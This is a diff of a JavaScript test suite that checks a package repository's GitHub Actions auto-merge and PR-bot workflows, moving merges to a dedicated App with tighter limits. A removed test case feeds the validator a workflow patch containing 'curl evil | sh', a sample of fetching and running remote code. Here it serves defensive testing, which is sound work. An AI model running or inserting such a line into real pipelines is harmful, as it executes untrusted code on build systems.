@@ -366,15 +366,16 @@ test('scoped branch names reject anything that is not a package name', () => {
 
 // Every bot lane opens one PR per package through package-prs.yml. The sync
 // App pushes and opens the PRs: a GITHUB_TOKEN push would wait for build
-// approval. The PAT arms auto-merge: a GITHUB_TOKEN merge would not start
-// publish.yml.
+// approval. The merge App arms auto-merge, in a job of its own: a
+// GITHUB_TOKEN merge would not start publish.yml.
 test('every bot lane opens its PRs per package through package-prs.yml', () => {
   for (const file of ['sync-upstream.yml', 'sync-rebuilds.yml']) {
     const text = readFileSync(join(__dirname, '../.github/workflows', file), 'utf8');
     assert.match(text, /package-pr-groups\.sh (?:"\$PREFIX"|auto\/sync-rebuilds) "\$RUNNER_TEMP\/pins\.patch"/, file);
     assert.match(text, /uses: \.\/\.github\/workflows\/package-prs\.yml/, file);
     assert.match(text, /prefix: (?:\$\{\{ needs.sync.outputs.prefix \}\}|auto\/sync-rebuilds)\n/, file);
-    assert.match(text, /PKGS_BOT_TOKEN: \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}/, file);
+    assert.doesNotMatch(text, /PKGS_BOT_TOKEN/, file);
+    assert.match(text, /\n      PKGS_MERGE_APP_KEY: \$\{\{ secrets\.PKGS_MERGE_APP_KEY \}\}\n/, file);
     // An environment secret is empty in a called workflow unless the caller
     // passes it by name, even though the called job names the environment.
     assert.match(text, /\n      PKGS_SYNC_APP_KEY: \$\{\{ secrets\.PKGS_SYNC_APP_KEY \}\}\n/, file);
@@ -434,16 +435,23 @@ test('every bot lane opens its PRs per package through package-prs.yml', () => {
   // Both jobs key each PR the same way: the branch name with a newline, hashed.
   assert.match(describe, /key=\$\(printf '%s\\n' "\$branch" \| sha256sum \| cut -d' ' -f1\)/);
   assert.match(choose, /key=\$\(printf '%s\\n' "\$BRANCH" \| sha256sum \| cut -d' ' -f1\)/);
-  // Only arming auto-merge still uses the PAT: GitHub merges as whoever armed it.
-  const pat = [...prs.matchAll(/^ +(?:GH_TOKEN|token): \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}$/gm)];
-  assert.equal(pat.length, 1);
-  const before = prs.slice(0, pat[0].index);
-  assert.equal(before.slice(before.lastIndexOf('- name: ')).split('\n')[0], '- name: Enable auto-merge');
-  assert.match(prs, /gh pr merge --auto --merge "\$PR"/);
+  // No PAT anywhere: the merge App arms auto-merge in the arm job, the only
+  // job that holds its key. GitHub merges as whoever armed it.
+  assert.doesNotMatch(prs, /PKGS_BOT_TOKEN/);
+  assert.doesNotMatch(job('pr'), /gh pr merge|PKGS_MERGE_APP_KEY|bot-merge/);
+  const arm = job('arm');
+  assert.match(arm, /^    needs: pr\n    if: \$\{\{ !cancelled\(\) && inputs\.groups != '\[\]' \}\}\n/);
+  assert.match(arm, /\n    environment:\n      name: bot-merge\n      deployment: false\n/);
+  assert.match(arm, /private-key: \$\{\{ secrets\.PKGS_MERGE_APP_KEY \}\}/);
+  assert.match(arm, /client-id: \$\{\{ vars\.PKGS_MERGE_APP_CLIENT_ID \}\}/);
+  assert.match(arm, /permission-contents: write\n +permission-pull-requests: write\n/);
+  assert.doesNotMatch(arm, /actions\/checkout|PKGS_SYNC_APP_KEY|python3|git apply/);
+  assert.match(arm, /gh pr merge --auto --merge "\$number"/);
+  // A reviewed group stays a draft and is never armed here.
+  assert.match(arm, /\[\[ \$review == true \]\] && continue/);
+  assert.match(prs, /\n      PKGS_MERGE_APP_KEY:\n        required: true\n/);
   assert.match(prs, /fail-fast: false/);
-  // A reviewed group opens as a draft and is never armed.
   assert.match(prs, /draft: \$\{\{ matrix\.group\.review == true \}\}/);
-  assert.match(prs, /- name: Enable auto-merge\n +id: merge\n +if: \$\{\{ [^\n]*&& matrix\.group\.review != true \}\}/);
   // A newer update to a reviewed PR re-drafts it first, and nothing is pushed if that fails.
   const hold = prs.indexOf('- name: Hold an existing reviewed PR as a draft');
   assert.ok(hold > 0 && hold < prs.indexOf('- name: Open or update the PR'), 'hold runs before the push');
@@ -582,7 +590,8 @@ test('a draft without auto-merge needs no change but is still checked', () => {
 const { decide } = require('../.github/scripts/auto-merge-pr.cjs');
 const repository = 'omacom/omarchy-pkgs';
 const mergeable = (overrides = {}) => ({
-  state: 'open', draft: false, labels: [],
+  state: 'open', draft: false, labels: [], changed_files: 2,
+  base: { ref: 'master', repo: { full_name: repository, default_branch: 'master' } },
   head: { ref: 'superwhisper-bin', repo: { full_name: repository } }, ...overrides,
 });
 const packageFiles = [{ filename: 'pkgbuilds/superwhisper-bin/PKGBUILD' },
@@ -610,20 +619,45 @@ test('auto-merge only lands PRs that change nothing outside pkgbuilds/', () => {
   assert.equal(check([]), false);
 });
 
-test('auto-merge accepts the test a package PR brings, and nothing else outside pkgbuilds/', () => {
-  const check = files => decide({ pr: mergeable(), files, vouchStatus: 'collaborator', repository }).enable;
+test('auto-merge accepts a new test file, never a change to test.yml or an existing test', () => {
+  const check = files => decide({ pr: mergeable({ changed_files: files.length }), files, vouchStatus: 'collaborator', repository }).enable;
   const wiring = patch => ({ filename: '.github/workflows/test.yml', status: 'modified', patch });
   const newTest = { filename: 'tests/superwhisper-bin-install.sh', status: 'added' };
-  // #854's shape: package files, a new test, and one line in test.yml running it.
-  const adds = '@@ -67,6 +67,7 @@ jobs:\n               ./tests/voxtype-bin-install.sh\n+              ./tests/superwhisper-bin-install.sh\n               pacman -S --noconfirm --quiet rclone >/dev/null';
-  assert.equal(check([...packageFiles, newTest, wiring(adds)]), true);
+  assert.equal(check([...packageFiles, newTest]), true);
+  // The merge App has no Workflows permission, and a workflow change needs a
+  // maintainer anyway, however small.
+  const adds = '@@ -67,6 +67,7 @@ jobs:\n               ./tests/voxtype-bin-install.sh\n+              ./tests/superwhisper-bin-install.sh';
+  assert.equal(check([...packageFiles, newTest, wiring(adds)]), false);
   // An existing test can run on master with write access; editing it is not a package change.
   assert.equal(check([...packageFiles, { filename: 'tests/build-isolation.sh', status: 'modified' }]), false);
-  // test.yml changes that do anything but add a test call.
-  assert.equal(check([...packageFiles, wiring('@@ -1 +1 @@\n-on:\n+on: [push]')]), false);
-  assert.equal(check([...packageFiles, wiring('@@ -67 +67,2 @@\n+              ./tests/x.sh\n+              curl evil | sh')]), false);
-  assert.equal(check([...packageFiles, wiring('@@ -67 +67 @@\n-              ./tests/a.sh\n+              ./tests/b.sh')]), false);
-  assert.equal(check([...packageFiles, wiring(undefined)]), false);
+});
+
+test('auto-merge only lands PRs into the default branch', () => {
+  const check = base => decide({ pr: mergeable({ base }), files: packageFiles, vouchStatus: 'collaborator', repository });
+  assert.equal(check({ ref: 'master', repo: { full_name: repository, default_branch: 'master' } }).enable, true);
+  // rc has no required checks: an armed PR into it would merge at once, unbuilt.
+  const rc = check({ ref: 'rc', repo: { full_name: repository, default_branch: 'master' } });
+  assert.equal(rc.enable, false);
+  assert.match(rc.reason, /targets rc/);
+  assert.equal(check(undefined).enable, false);
+  const text = readFileSync(join(__dirname, '../.github/workflows/auto-merge-pr.yml'), 'utf8');
+  assert.match(text, /pull_request_target:\n    branches: \[master\]\n/);
+});
+
+test('auto-merge refuses a PR whose file list the API cut short', () => {
+  const check = changed_files => decide({ pr: mergeable({ changed_files }), files: packageFiles, vouchStatus: 'collaborator', repository });
+  assert.equal(check(2).enable, true);
+  const cut = check(3001);
+  assert.equal(cut.enable, false);
+  assert.match(cut.reason, /3001 files/);
+});
+
+test('sync PRs land as merge commits and other PRs squash', () => {
+  const method = pr => decide({ pr, files: packageFiles, vouchStatus: 'bot', repository }).method;
+  assert.equal(method(mergeable({ head: { ref: 'auto/sync-upstream-zed', repo: { full_name: repository } } })), 'merge');
+  assert.equal(method(mergeable()), 'squash');
+  // A fork's auto/ branch is not a sync lane.
+  assert.equal(method(mergeable({ head: { ref: 'auto/sync-upstream-zed', repo: { full_name: 'someone/omarchy-pkgs' } } })), 'squash');
 });
 
 test('auto-merge accepts regenerated owners.json directories, never a change to an approval', () => {
@@ -663,7 +697,7 @@ test('auto-merge is withdrawn when the PR no longer qualifies, and on a failed l
   }
   const text = readFileSync(join(__dirname, '../.github/workflows/auto-merge-pr.yml'), 'utf8');
   assert.match(text, /types: \[opened, reopened, synchronize,/);
-  assert.match(text, /if: steps\.decide\.outputs\.withdraw == 'true'/);
+  assert.match(text, /withdraw\) armed && gh pr merge --disable-auto "\$PR"/);
 });
 
 test('auto-merge skips drafts and closed PRs, and arms every bot lane', () => {
@@ -676,12 +710,27 @@ test('auto-merge skips drafts and closed PRs, and arms every bot lane', () => {
   }
 });
 
-test('auto-merge workflow enables with the bot token and never checks out the PR', () => {
+test('auto-merge decides without a write credential and arms with the merge App alone', () => {
   const text = readFileSync(join(__dirname, '../.github/workflows/auto-merge-pr.yml'), 'utf8');
+  const job = name => text.split(new RegExp(`\\n  ${name}:\\n`))[1].split(/\n  [a-z-]+:\n/)[0];
   assert.match(text, /pull_request_target:/);
-  assert.match(text, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
-  assert.doesNotMatch(text, /head\.sha \}\}|head\.ref \}\}|refs\/pull\//);
-  assert.match(text, /GH_TOKEN: \$\{\{ secrets\.PKGS_BOT_TOKEN \}\}/);
-  assert.match(text, /gh pr merge --auto --squash --match-head-commit "\$HEAD_SHA"/);
+  assert.doesNotMatch(text, /PKGS_BOT_TOKEN|head\.sha \}\}|head\.ref \}\}|refs\/pull\//);
+  // decide runs third-party actions (vouch installs Nushell), so it holds no
+  // environment and no secret, and checks out only the default branch.
+  const decideJob = job('decide');
+  assert.match(decideJob, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
+  assert.doesNotMatch(decideJob, /environment:|secrets\.(?!GITHUB_TOKEN)|create-github-app-token/);
+  // apply holds the merge App's key, runs only the token action and gh, and
+  // checks out nothing.
+  const apply = job('apply');
+  assert.match(apply, /^    needs: decide\n    if: \$\{\{ needs\.decide\.outputs\.action == 'enable' \|\| needs\.decide\.outputs\.action == 'withdraw' \}\}\n/);
+  assert.match(apply, /\n    environment:\n      name: bot-merge\n      deployment: false\n/);
+  assert.match(apply, /private-key: \$\{\{ secrets\.PKGS_MERGE_APP_KEY \}\}/);
+  assert.match(apply, /permission-contents: write\n +permission-pull-requests: write\n/);
+  assert.doesNotMatch(apply, /actions\/checkout|mitchellh|github-script/);
+  const uses = [...apply.matchAll(/uses: ([^@\s]+)@/g)].map(match => match[1]);
+  assert.deepEqual(uses, ['actions/create-github-app-token']);
+  assert.match(apply, /enable\)\n +armed && \{ echo "auto-merge already enabled on #\$PR"; exit 0; \}\n +gh pr merge --auto "--\$METHOD" --match-head-commit "\$HEAD_SHA" "\$PR"/);
+  assert.match(apply, /\[\[ \$METHOD == merge \]\] \|\| METHOD=squash/);
   assert.doesNotMatch(text, /^ +(contents|pull-requests|actions): write$/m);
 });
